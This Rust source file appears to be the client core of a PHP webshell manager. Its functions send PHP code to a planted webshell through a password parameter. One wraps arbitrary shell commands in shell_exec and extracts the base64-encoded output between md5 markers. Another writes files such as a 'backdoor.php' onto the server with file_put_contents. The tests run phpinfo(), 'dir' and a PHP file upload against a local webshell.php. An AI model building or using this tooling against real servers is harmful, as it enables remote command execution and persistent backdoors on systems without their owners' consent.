use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use regex::Regex;
use reqwest::{self, Client};
use serde_urlencoded;
use std::collections::HashMap;
use url::Url;

// const FILE_UPLOAD_PHP: String = ""

pub async fn get_with_key<T: AsRef<str>, E: AsRef<str>, U: AsRef<str>>(
    url: T,
    key: E,
    value: U,
    client: &Client,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut url = Url::parse(url.as_ref())?;
    url.query_pairs_mut()
        .append_pair(key.as_ref(), value.as_ref());

    let res = client.get(url).send().await?;

    // println!("{}", res.text().await?);
    Ok(res.text().await?)
}

pub async fn post_with_key<T: AsRef<str>, E: AsRef<str>, U: AsRef<str>>(
    url: T,
    key: E,
    value: U,
    client: &Client,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut date = HashMap::new();
    date.insert(key.as_ref(), value.as_ref());

    let encoded_data = serde_urlencoded::to_string(&date)?;
    // println!("encoded_data: {:?}", encoded_data);

    let res = client
        .post(url.as_ref())
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(encoded_data)
        .send()
        .await?;

    if !res.status().is_success() {
        println!("POST 请求失败: {}", res.status());
    }

    Ok(res.text().await?)
}

///# Example
/// ```
/// let url = "https://example.com/api";
/// let mut params = HashMap::new();
/// params.insert("key1", "value1");
/// params.insert("key2", "value2");
/// let client = Client::new();
/// let response = post_request(&client, url, params).await?;
/// println!("Response: {}", response);
/// ```
async fn post_request(
    client: &Client,
    url: &str,
    params: HashMap<&str, &str>,
) -> Result<String, reqwest::Error> {
    let res = client.post(url).form(&params).send().await?;

    let body = res.text().await?;
    Ok(body)
}

pub async fn echo_base64_encode_system_command<E: AsRef<str>>(
    url: String,
    key: E,
    command: String,
) -> Result<String, Box<dyn std::error::Error>> {
    // 返回的值是base64编码过的
    // TODO:
    // 1. get_res_text 没用到,
    // 2. 接受的不是 base64 字符串

    let rand_separator = gen_random_key();
    let command = format!(
        "echo md5(\"{rand_separator}\");echo base64_encode(shell_exec(\"{command}\"));echo md5(\"{rand_separator}\");"
    );
    let client = Client::new();

    let post_res_text = post_with_key(&url, &key, &command, &client).await?;
    let _get_res_text = get_with_key(&url, &key, &command, &client).await?;

    let rand_separator = md5(rand_separator);

    dbg!(&rand_separator);
    // 正则匹配
    let pattern = format!(
        "{}(.*?){}",
        regex::escape(&rand_separator),
        regex::escape(&rand_separator)
    );

    dbg!(&pattern);
    dbg!(&post_res_text);
    // dbg!(&get_res_text);

    let re = Regex::new(&pattern).unwrap();
    let find_warpped_text = re
        .captures(&post_res_text)
        .and_then(|caps| caps.get(1).map(|m| m.as_str().to_string()));
    match find_warpped_text {
        Some(content) => Ok(content),
        None => Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Error in matching pattern.",
        ))),
    }
}

pub fn gen_random_key() -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(30)
        .map(char::from)
        .collect()
}

/// result example 123 -> 202cb962ac59075b964b07152d234b70
pub fn md5(input: String) -> String {
    let digest = md5::compute(input);
    format!("{:x}", digest)
}

/// 使用 php 的 file_put_contents() 函数进行文件上传
pub async fn file_upload(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: Client,
) -> Result<bool, reqwest::Error> {
    let command = format!(r#"file_put_contents("{filename}", "{file}");"#);
    // file_put_contents('backdoor.php', '112233');

    // TODO: 此处只考虑了 post 方法

    dbg!(&command);

    let params = HashMap::from([(key, command.as_str())]);

    let _ = post_request(&client, &url, params).await?;

    Ok(is_url_return_ok(&url, &client).await)
}

pub async fn is_url_return_ok(url: &str, client: &Client) -> bool {
    let response = client.get(url).send().await;
    response.is_ok()
}

pub async fn upload_base64_file(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: Client,
) -> Result<bool, reqwest::Error> {
    Ok(true)
}

#[cfg(test)]
mod tests {

    use super::*;

    const URL: &str = "http://127.0.0.1/webshell.php";
    const KEY: &str = "1";

    #[tokio::test]
    async fn test_get() {
        let client = reqwest::Client::new();
        let res = get_with_key(
            "http://127.0.0.1/webshell.php".to_string(),
            "1",
            "phpinfo();",
            &client,
        )
        .await
        .unwrap();
        println!("res: {:?}", res);
    }

    #[test]
    fn test_rand() {
        println!("{:?}", gen_random_key());
    }

    #[tokio::test]
    async fn test_echo_system_command() -> Result<(), Box<dyn std::error::Error>> {
        let text = echo_base64_encode_system_command(
            "http://127.0.0.1/webshell.php".to_string(),
            "1",
            "dir".to_string(),
        )
        .await?;
        println!("{:?}", text);
        Ok(())
    }

    #[tokio::test]
    async fn test_file_upload() {
        let file = "testforfileupload1";
        let file_name = "test_file.php";
        let client = Client::new();
        let res = file_upload(URL, KEY, file, file_name, client)
            .await
            .unwrap_or_else(|_| false);
        println!("{:?}", res)
    }
}
